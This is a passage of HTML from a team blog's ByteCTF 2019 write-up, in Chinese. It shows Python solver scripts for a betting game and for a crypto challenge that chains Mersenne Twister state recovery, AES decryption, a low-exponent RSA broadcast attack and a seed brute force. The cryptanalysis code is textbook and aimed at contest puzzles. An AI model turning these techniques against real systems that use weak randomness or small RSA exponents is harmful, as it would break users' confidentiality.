class="line">	now = lis1</span><br><span class="line">	rec = io.recvline()[-<span class="number">2</span>]</span><br><span class="line">	io.sendline(now[rec])</span><br><span class="line">	msg = io.recvline()</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;you win&#x27;</span> <span class="keyword">in</span> msg:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;win&#x27;</span>)</span><br><span class="line">	now = lis2</span><br><span class="line">	rec = io.recvline()[-<span class="number">2</span>]</span><br><span class="line">	io.sendline(now[rec])</span><br><span class="line">	msg = io.recvline()</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;you win&#x27;</span> <span class="keyword">in</span> msg:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;win&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	sjb()</span><br></pre></td></tr></table></figure>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="lrlr"><a href="#lrlr" class="headerlink" title="lrlr"></a>lrlr</h3><p>大致思路就是伪随机预测+rsa的低指数广播攻击</p>
<p>MTRecover得到了所有的key<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> MTRecover <span class="keyword">import</span> MT19937Recover</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;old&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bits = f.read().split(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">dis = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> bits:</span><br><span class="line">    dis.append(<span class="built_in">int</span>(_))</span><br><span class="line"></span><br><span class="line">mtb = MT19937Recover()</span><br><span class="line">rand = mtb.go(dis)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">72</span>):</span><br><span class="line">	next_rand = rand.getrandbits(<span class="number">128</span>)</span><br><span class="line">	<span class="built_in">print</span> next_rand</span><br></pre></td></tr></table></figure></p>
<p>根据key解密aes</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stateconvert</span>(<span class="params">key,text</span>):</span><br><span class="line">    key = long_to_bytes(key)</span><br><span class="line">    handle = AES.new(key, AES.MODE_CBC, <span class="string">&quot;\x00&quot;</span>*<span class="number">16</span>)</span><br><span class="line">    output = handle.decrypt(text)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;new&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	new = f.read().split(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	key = f.read().split(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">tmp1 = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">	tmp1.append(bytes_to_long(stateconvert(<span class="built_in">int</span>(key[<span class="built_in">len</span>(key)+i-<span class="number">24</span>]),new[i].decode(<span class="string">&quot;hex&quot;</span>))))</span><br><span class="line"></span><br><span class="line">tmp2 = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">	tmp2.append(bytes_to_long(stateconvert(<span class="built_in">int</span>(key[<span class="built_in">len</span>(key)+i-<span class="number">48</span>]),long_to_bytes(tmp1[i]))))</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;clist&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp2:</span><br><span class="line">	s += <span class="built_in">str</span>(i).replace(<span class="string">&quot;L&quot;</span>,<span class="string">&quot;&quot;</span>)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">f.write(s)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>rsa低指数广播攻击</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRT</span>(<span class="params">items</span>):</span><br><span class="line">    N = reduce(<span class="keyword">lambda</span> x, y: x * y, (i[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> items))</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> a, n <span class="keyword">in</span> items:</span><br><span class="line">        m = N / n</span><br><span class="line">        d, r, s = gmpy2.gcdext(n, m)</span><br><span class="line">        <span class="keyword">if</span> d != <span class="number">1</span>: <span class="keyword">raise</span> Exception(<span class="string">&quot;Input not pairwise co-prime&quot;</span>)</span><br><span class="line">        result += a * s * m</span><br><span class="line">    <span class="keyword">return</span> result % N, N</span><br><span class="line"><span class="comment"># 读入 e, n, c</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;clist&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	clist = f.read().split(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;cl&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	cl = f.read().replace(<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> clist:</span><br><span class="line">	c.append(<span class="built_in">int</span>(i))</span><br><span class="line">n = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cl:</span><br><span class="line">	n.append(<span class="built_in">int</span>(i,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[+]Detecting m...&#x27;</span></span><br><span class="line">data = <span class="built_in">zip</span>(c, n)</span><br><span class="line">x, n = CRT(data)</span><br><span class="line">realnum = gmpy2.iroot(gmpy2.mpz(x), e)[<span class="number">0</span>].digits()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;  [-]m is: &#x27;</span> + <span class="string">&#x27;&#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(realnum))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[!]All Done!&#x27;</span></span><br></pre></td></tr></table></figure>
<p>rsa也出了，然后最后一步逆种子Orz<br>init_state = 0x87c303deaa0880e30957a1c3886a86f100c3a67381d022cd00ab8b3b028bd87c<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_init_state</span>(<span class="params">seed</span>):</span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    <span class="comment"># print bin(seed)[2:]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>(seed)[<span class="number">2</span>:]:</span><br><span class="line">        a = a &lt;&lt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">int</span>(i)):</span><br><span class="line">            a = a ^ seed</span><br><span class="line">        <span class="keyword">if</span> a &gt;&gt; <span class="number">256</span>:</span><br><span class="line">            a = a ^ <span class="number">0x10000000000000000000000000000000000000000000000000000000000000223L</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">result = <span class="number">0x87c303deaa0880e30957a1c3886a86f100c3a67381d022cd00ab8b3b028bd87c</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">    result = generate_init_state(result)</span><br><span class="line">    <span class="keyword">if</span> long_to_bytes(result)[-<span class="number">1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">    	<span class="built_in">print</span> long_to_bytes(result)</span><br></pre></td></tr></table></figure></p>
<p>根据异或性质直接爆回去<br><img src="https://hackmd.summershrimp.com/uploads/upload_e098d7bf802d700acd98ac57755507e7.png" alt=""></p>
<p>坑点在于flag格式 爆了半天bytectf</p>

  </article>
  <aside class="table-content" id="site-toc">
  <div class="table-content-title">
    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
    <span>目录</span>
  </div>
  <div class="table-content-main">
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#boring-code"><span class="toc-text">boring_code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EzCMS"><span class="toc-text">EzCMS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rss"><span class="toc-text">rss</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#note-five"><span class="toc-text">note_five</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vip"><span class="toc-text">vip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mheap"><span class="toc-text">mheap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mulnote"><span class="toc-text">mulnote</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#childjs"><span class="toc-text">childjs</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jigsaw"><span class="toc-text">jigsaw</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#betgame"><span class="toc-text">betgame</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#lrlr"><span class="toc-text">lrlr</span></a></li></ol></li></ol>
  </div>
</aside>
  
    <aside class="passage-copyright">
      <div>本文作者: SUers</div>
      
        <div>
          原文链接: 
          <a href="" target="_blank">https://team-su.github.io/2019/09/14/2019-09-07-ByteCTF/</a>
        </div>
      
      <div>
        版权声明: 本博客所有文章除特别声明外, 均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议. 转载请注明出处!
      </div>
    </aside>
  
  
    <div class="passage-tags">
     
      <a href="/tags/ByteCTF/"><i class="fa fa-tags"></i>ByteCTF</a>
    
    </div>
  
</div>

    </main>
    
    <div class="site-footer-wrapper">
  <footer class="site-footer">
    
    <div class="site-footer-info">
      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
    </div>
    
    
      <div class="site-footer-info">
        <i class="fa fa-at"></i> Email: suers_xctf@126.com
      </div>
    
    <div class="site-footer-info">
      <i class="fa fa-copyright"></i> 
      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
      All rights reserved.
    </div>
  </footer>
</div>
    <div id="site-layer" style="display:none;">
  <div class="site-layer-content">
    <div class="site-layer-header">
      <span class="site-layer-header-title" id="site-layer-title"></span>
      <i class="fa fa-close" id="site-layer-close"></i>
    </div>
    <div class="site-layer-body" id="site-layer-container">
      <div class="site-layer-input" id="site-layer-search" style="display: none;">
        <div class="site-layer-input-choose">
          <a href="javascript:void(0);" title="Change Search Engine">Google</a>
        </div>
        <input type="text">
        <i class="fa fa-search"></i>
      </div>
      
      <div id="site-layer-welcome" style="display:none;"></div>
    </div>
  </div>
</div>
    

<div class="bottom-bar">
  <div class="bottom-bar-left">
    <a href="/2020/03/10/2020-03-10-gxzyCTF/" data-enable="true">
      <i class="fa fa-arrow-left"></i>
    </a>
    <a href="/2019/08/22/2019-08-22-SUCTF/" data-enable="true">
      <i class="fa fa-arrow-right"></i>
    </a>
  </div>
  <div class="bottom-bar-right">
    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
      <i class="fa fa-bars"></i>
    </a>
    
    <a href="javascript:void(0);" id="site-toggle-share-btn">
      <i class="fa fa-share-alt"></i>
    </a>
    
    <a href="javascript:void(0);" id="back-top-btn">
      <i class="fa fa-chevron-up"></i>
    </a>
  </div>
</div>
    <div id="share-btn">
  
  
  
  
  
</div>
    
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-112937997-3"></script>
  <script async>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-112937997-3');
  </script>






    
  </body>
</html>